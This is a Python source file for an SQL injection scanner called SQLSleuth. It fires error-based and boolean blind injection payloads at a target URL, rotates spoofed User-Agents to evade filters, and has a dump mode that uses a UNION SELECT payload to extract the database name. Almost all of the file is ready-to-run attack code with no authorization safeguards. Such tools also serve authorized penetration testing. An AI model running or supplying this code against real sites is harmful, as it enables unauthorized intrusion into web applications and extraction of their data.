#!/usr/bin/env python3
"""
SQLSleuth - Advanced SQL Injection Scanner
Author: ObliviousK0t
Description:
    Lightweight SQL injection detection tool that supports
    - Error-based SQLi detection
    - Boolean-based blind SQLi detection
    - Multi-threaded payload testing
    - Custom headers, cookies, and payloads
    - Experimental database name extraction (dump mode)
"""

import requests
import argparse
import concurrent.futures
import random
import re
from colorama import Fore, Style
from datetime import datetime

# Common SQL error patterns to detect error-based injection responses
ERROR_SIGNATURES = [
    "you have an error in your sql syntax",
    "mysql_fetch_array()",
    "unclosed quotation mark",
    "quoted string not properly terminated",
    "sqlstate",
    "odbc",
    "native client",
    "ora-01756"
]

# A set of randomized User-Agent strings to bypass basic filters
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/117.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.60 Mobile Safari/537.36",
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
]

LOG_FILE = "scan_results.txt"

# ------------------ UI Banner ------------------
def banner():
    """Prints a custom ASCII banner when the tool starts"""
    ascii_art = f"""{Fore.LIGHTMAGENTA_EX}

  ____   ___  _     ____  _            _   _     
 / ___| / _ \| |   / ___|| | ___ _   _| |_| |__  
 \___ \| | | | |   \___ \| |/ _ \ | | | __| '_ \ 
  ___) | |_| | |___ ___) | |  __/ |_| | |_| | | |
 |____/ \__\_\_____|____/|_|\___|\__,_|\__|_| |_|
                                                 

    {Fore.CYAN}SQL Injection Scanner{Style.RESET_ALL}
    {Fore.YELLOW}Author: ObliviousK0t{Style.RESET_ALL}
    """
    print(ascii_art)

# ------------------ Utility Functions ------------------
def log_result(message):
    """Append scan results to a log file with timestamp"""
    with open(LOG_FILE, "a") as f:
        f.write(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {message}\n")

def is_vulnerable(response_text):
    """Check if response contains known SQL error patterns"""
    return any(err.lower() in response_text.lower() for err in ERROR_SIGNATURES)

def load_payloads(file_path):
    """Load payloads from a file, one per line"""
    try:
        with open(file_path, "r") as f:
            return [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print(Fore.RED + f"[!] Payload file '{file_path}' not found!" + Style.RESET_ALL)
        return []

def parse_cookie(cookie_str):
    """Convert a cookie string into a dictionary"""
    cookies = {}
    if cookie_str:
        for part in cookie_str.split(';'):
            if '=' in part:
                k, v = part.strip().split('=', 1)
                cookies[k] = v
    return cookies

def parse_headers(header_list):
    """Convert a list of custom headers into a dictionary"""
    headers = {}
    if header_list:
        for header in header_list:
            if ':' in header:
                k, v = header.split(':', 1)
                headers[k.strip()] = v.strip()
    return headers

def get_random_user_agent():
    """Returns a random User-Agent string for stealth"""
    return random.choice(USER_AGENTS)

def send_request(url, payload, method="GET", data=None, cookies=None, headers=None):
    """Send GET/POST requests with injected payloads"""
    try:
        session = requests.Session()
        if headers is None:
            headers = {}
        if "User-Agent" not in headers:
            headers["User-Agent"] = get_random_user_agent()

        if method == "POST":
            post_data = data.replace("INJECT", payload)
            data_dict = dict(x.split('=', 1) for x in post_data.split('&'))
            return session.post(url, data=data_dict, cookies=cookies, headers=headers, timeout=5)
        else:
            return session.get(url + payload, cookies=cookies, headers=headers, timeout=5)
    except requests.exceptions.RequestException:
        return None

# ------------------ Dump Mode (Experimental) ------------------
def dump_database(url, cookies=None, headers=None):
    """
    Attempts to extract the database name using a basic UNION SELECT payload.
    This feature is experimental and may not work on all targets.
    """
    print(Fore.MAGENTA + "[*] Dump mode enabled! Trying to extract DB name..." + Style.RESET_ALL)
    log_result(f"[DUMP MODE] Attempting database enumeration on {url}")

    payload = "' UNION SELECT database(),null-- "
    r = send_request(url, payload, "GET", None, cookies, headers)

    if r and r.status_code == 200:
        match = re.search(r">([a-zA-Z0-9_\-]+)<", r.text)
        if match:
            db_name = match.group(1)
            print(Fore.GREEN + f"[DUMP] Database Name: {db_name}" + Style.RESET_ALL)
            log_result(f"[DUMP] Extracted Database Name: {db_name}")
        else:
            print(Fore.YELLOW + "[!] Dump mode: No DB name found (possibly filtered)." + Style.RESET_ALL)
            log_result("[DUMP] Attempted DB extraction but no name detected.")
    else:
        print(Fore.RED + "[!] Dump mode request failed or blocked." + Style.RESET_ALL)
        log_result("[DUMP] DB extraction request failed.")

# ------------------ SQLi Testing Functions ------------------
def test_error_based(url, payload_file, method="GET", post_data=None, threads=5, cookies=None, headers=None, dump=False):
    """
    Tests for error-based SQL injection using payloads from the file.
    Uses multi-threading to speed up payload testing.
    """
    payloads = load_payloads(payload_file)
    if not payloads:
        return

    print(f"[i] Using {threads} threads | Payloads: {payload_file} | UA Randomization: ON")
    log_result(f"[*] Started error-based scan on {url}")

    found_vulnerable = False
    dump_triggered = False

    def worker(p):
        nonlocal found_vulnerable, dump_triggered
        if found_vulnerable:
            return
        r = send_request(url, p, method, post_data, cookies, headers)
        if r and is_vulnerable(r.text):
            print(Fore.GREEN + f"[+] Vulnerable! SQL error triggered with payload: {p}" + Style.RESET_ALL)
            log_result(f"[VULNERABLE] {url} | Payload: {p}")
            found_vulnerable = True
            if dump and not dump_triggered:
                dump_database(url, cookies, headers)
                dump_triggered = True

    with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
        futures = [executor.submit(worker, p) for p in payloads]
        concurrent.futures.wait(futures)

    if not found_vulnerable:
        print(Fore.YELLOW + "[!] No error-based SQLi found with current payloads." + Style.RESET_ALL)
        log_result(f"[SAFE] No error-based SQLi detected on {url}")

def test_boolean_based(url, method="GET", post_data=None, cookies=None, headers=None, dump=False):
    """Tests for Boolean-based blind SQL injection by comparing responses"""
    dump_triggered = False
    true_payload = " AND 1=1--"
    false_payload = " AND 1=2--"

    r_true = send_request(url, true_payload, method, post_data, cookies, headers)
    r_false = send_request(url, false_payload, method, post_data, cookies, headers)

    if r_true and r_false and len(r_true.text) != len(r_false.text):
        print(Fore.GREEN + f"[+] Boolean-based SQLi detected at {url}" + Style.RESET_ALL)
        log_result(f"[VULNERABLE] Boolean-based SQLi detected at {url}")
        if dump and not dump_triggered:
            dump_database(url, cookies, headers)
            dump_triggered = True
    else:
        print(Fore.YELLOW + "[!] No Boolean-based differences found (not conclusive)." + Style.RESET_ALL)
        log_result(f"[SAFE] No Boolean-based SQLi detected on {url}")

# ------------------ Entry Point ------------------
def main():
    """Parses CLI arguments and starts the scan"""
    parser = argparse.ArgumentParser(description="SQLSleuth - Advanced SQL Injection Scanner")
    parser.add_argument("-u", "--url", help="Target URL with parameter (e.g., http://site.com/page?id=1)")
    parser.add_argument("-d", "--data", help="POST data (use 'INJECT' where payload should be injected)")
    parser.add_argument("-t", "--threads", type=int, default=5, help="Threads to use (default: 5)")
    parser.add_argument("-c", "--cookie", help="Session cookies (e.g., PHPSESSID=abc123; security=low)")
    parser.add_argument("--header", action="append", help="Custom headers (e.g., 'User-Agent: Custom')")
    parser.add_argument("-p", "--payloads", default="payloads.txt", help="Custom payload file (default: payloads.txt)")
    parser.add_argument("--dump", action="store_true", help="Enable experimental DB extraction")
    args = parser.parse_args()

    banner()

    if not args.url:
        print(Fore.RED + "[!] Missing target URL (-u)" + Style.RESET_ALL)
        return

    cookies = parse_cookie(args.cookie) if args.cookie else None
    headers = parse_headers(args.header) if args.header else None
    method = "POST" if args.data else "GET"

    log_result(f"\n=== New Scan Started ===")
    log_result(f"Target: {args.url} | Method: {method} | Payloads: {args.payloads} | Dump: {args.dump}")

    print(f"[i] Testing {args.url} for error-based SQLi...")
    test_error_based(args.url, args.payloads, method, args.data, args.threads, cookies, headers, args.dump)

    print(f"[i] Testing {args.url} for Boolean-based blind SQLi...")
    test_boolean_based(args.url, method, args.data, cookies, headers, args.dump)

    log_result(f"=== Scan Finished for {args.url} ===\n")

if __name__ == "__main__":
    main()
